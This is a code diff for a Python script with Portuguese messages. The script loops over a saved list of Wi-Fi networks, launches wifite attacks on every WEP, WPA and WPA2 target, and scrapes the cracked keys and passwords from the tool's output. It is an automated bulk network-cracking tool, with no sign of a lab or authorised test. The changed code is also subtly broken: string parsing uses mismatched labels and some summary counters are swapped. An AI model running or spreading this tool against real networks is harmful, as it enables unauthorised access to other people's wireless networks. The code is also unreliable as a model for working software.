@@ -19,8 +19,7 @@ def start(database_file='networks.json'):
     del database[0]
 
     attack(database[:])
-    #for network in database:
-    #    attack(network)
+    
 
 
 def __loaddb(file_name):
@@ -49,10 +48,15 @@ def attack(networks):
     for net in networks:
         try:
             if net["privacity"] == 'WEP':
-                print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
                 analized_wep_networks_counter += 1
                 
-                dialog('[Alvo atual] >', net["essid"], net["bssid"])
+                print()
+                dialog('=== INICIANDO ATAQUE À REDE WEP ===', color='c', style='bold')
+                
+                dialog(f'Nome: {net["essid"]}', color='orange')
+                dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
+                dialog(f'WPS: {net["wps"]}', color='orange')
+                
                 show_wep_menu()
 
                 hex_key =__wep_attack(net)[2]
@@ -63,75 +67,69 @@ def attack(networks):
         except KeyboardInterrupt as e:
             dialog('Pulando para o próximo alvo!', color='o')
             continue
+    if analized_wep_networks_counter > 0:
+        dialog(f'Redes WEP analizadas: {analized_wep_networks_counter}', color='cian')
+        dialog(f'Redes WEP crackeadas: {cracked_wep_networks_counter}', color='cian')
 
     for net in networks:
         try:
-            if net["privacity"] == 'WPA':
+            if net["privacity"] == 'WPA' or net["privacity"] == 'WPA2' or net["privacity"] == 'WPA2 WPA':
                 if net["wps"] != 'Locke' and net["wps"] != 'Unknown':
-                    print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
                     analized_wpa_with_wps_networks_counter += 1
                     
-                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
+                    print()
+                    dialog('=== INICIANDO ATAQUE À REDE WPA COM WPS ===', color='b', style='bold')
+
+                    dialog(f'Nome: {net["essid"]}', color='orange')
+                    dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
+                    dialog(f'WPS: {net["wps"]}', color='orange')
+                    
                     show_wpa_wps_menu()
 
-                    password = __wpa_wps_attack(net)
+                    password = __wpa_wps_attack(net)[2]
 
                     if password != '':
                         cracked_wpa_with_wps_networks_counter += 1
-                else:
+        except KeyboardInterrupt as e:
+            dialog('Pulando para o próximo alvo!', color='o')
+            continue
+    if analized_wpa_with_wps_networks_counter > 0:
+        dialog(f'Redes WPA com WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
+        dialog(f'Redes WPA com WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')
+
+    for net in networks:
+        try:
+            if net["privacity"] == 'WPA' or net["privacity"] == 'WPA2' or net["privacity"] == 'WPA2 WPA':
+                if net["wps"] == 'Locke' or net["wps"] == 'Unknown':
                     analized_wpa_without_wps_networks_counter += 1
                     
-                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
-                    show_wpa_wps_menu()
+                    print()
+                    dialog('=== INICIANDO ATAQUE À REDE WPA ===', color='o', style='bold')
 
-                    password = __wpa_attack(net)
+                    dialog(f'Nome: {net["essid"]}', color='orange')
+                    dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
+                    dialog(f'WPS: {net["wps"]}', color='orange')
+                    
+                    show_wpa_menu()
+
+                    password = __wpa_attack(net)[2]
 
                     if password != '':
                         cracked_wpa_without_wps_networks_counter += 1
         except KeyboardInterrupt as e:
             dialog('Pulando para o próximo alvo!', color='o')
             continue
+    if analized_wpa_without_wps_networks_counter > 0:
+        dialog(f'Redes WPA sem WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
+        dialog(f'Redes WPA sem WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')
 
-    for net in networks:
-        try:
-            if net["privacity"] == 'WPA2':
-                if net["wps"] != 'Locke' and net["wps"] != 'Unknown':
-                    print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
-                    analized_wpa_with_wps_networks_counter += 1
-
-                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
-                    show_wpa_wps_menu()
-
-                    password = __wpa_wps_attack(net)
-
-                    if password != '':
-                        cracked_wpa_with_wps_networks_counter += 1
-                else:
-                    analized_wpa_without_wps_networks_counter += 1
-                    
-                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
-                    show_wpa_wps_menu()
-
-                    password = __wpa_attack(net)
-
-                    if password != '':
-                        cracked_wpa_without_wps_networks_counter += 1
-        except KeyboardInterrupt as e:
-            dialog('Pulando para o próximo alvo!', color='o')
-            continue
-            '''
-            else:
-                analized_wpa_without_wps_networks_counter += 1
-
-                show_wpa_menu()
-
-                password = __wpa_attack(net)
-
-                if password != '':
-                    cracked_wpa_without_wps_networks_counter += 1
-            '''
-    
-    #subprocess.run(['wifite', '-b', net["bssid"]], shell=True)
+    print('\n\n')
+    dialog(f'Redes WEP analizadas: {analized_wep_networks_counter}', color='cian')
+    dialog(f'Redes WEP crackeadas: {cracked_wep_networks_counter}', color='cian')
+    dialog(f'Redes WPA com WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
+    dialog(f'Redes WPA com WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')
+    dialog(f'Redes WPA sem WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
+    dialog(f'Redes WPA sem WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')
 
 def __wep_attack(net):
     wifite = Popen(['wifite', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
@@ -156,7 +154,7 @@ def __wep_attack(net):
                 hex_key = line.split('Hex Key: ')[1]
 
     except KeyboardInterrupt as e:
-        wifite.kill()
+        wifite.terminate()
     
     return essid, bssid, hex_key
     #print('='*30)
@@ -191,7 +189,7 @@ def __wpa_wps_attack(net):
     
     essid = ''
     bssid = ''
-    hex_key = ''
+    password = ''
 
     try:
         for line in iter(wifite.stdout.readline, ''):
@@ -201,19 +199,17 @@ def __wpa_wps_attack(net):
             print(line)
             sys.stdout.flush()
 
-            '''
-            if 'ESSID: ' in line:
+            if 'Access Point Name: ' in line:
                 essid = line.split('ESSID: ')[1]
-            if 'BSSID: ' in line:
-                bssid = line.split('BSSID: ')[1]
-            if 'Hex Key: ' in line:
-                hex_key = line.split('Hex Key: ')[1]
-            '''
+            if 'Access Point BSSID: ' in line:
+                bssid = line.split('Access Point Name: ')[1]
+            if '(password): ' in line:
+                password = line.split('(password): ')[1]
 
     except KeyboardInterrupt as e:
-        wifite.kill()
+        wifite.terminate()
     
-    return essid, bssid, hex_key
+    return essid, bssid, password
 
 
 def __wpa_attack(net):
@@ -221,7 +217,7 @@ def __wpa_attack(net):
     
     essid = ''
     bssid = ''
-    hex_key = ''
+    password = ''
 
     try:
         for line in iter(wifite.stdout.readline, ''):
@@ -231,19 +227,17 @@ def __wpa_attack(net):
             print(line)
             sys.stdout.flush()
 
-            '''
-            if 'ESSID: ' in line:
+            if 'Access Point Name: ' in line:
                 essid = line.split('ESSID: ')[1]
-            if 'BSSID: ' in line:
-                bssid = line.split('BSSID: ')[1]
-            if 'Hex Key: ' in line:
-                hex_key = line.split('Hex Key: ')[1]
-            '''
+            if 'Access Point BSSID: ' in line:
+                bssid = line.split('Access Point Name: ')[1]
+            if '(password): ' in line:
+                password = line.split('(password): ')[1]
 
     except KeyboardInterrupt as e:
-        wifite.kill()
+        wifite.terminate()
     
-    return essid, bssid, hex_key
+    return essid, bssid, password
 
 
 def cleanANSIcodes(text):
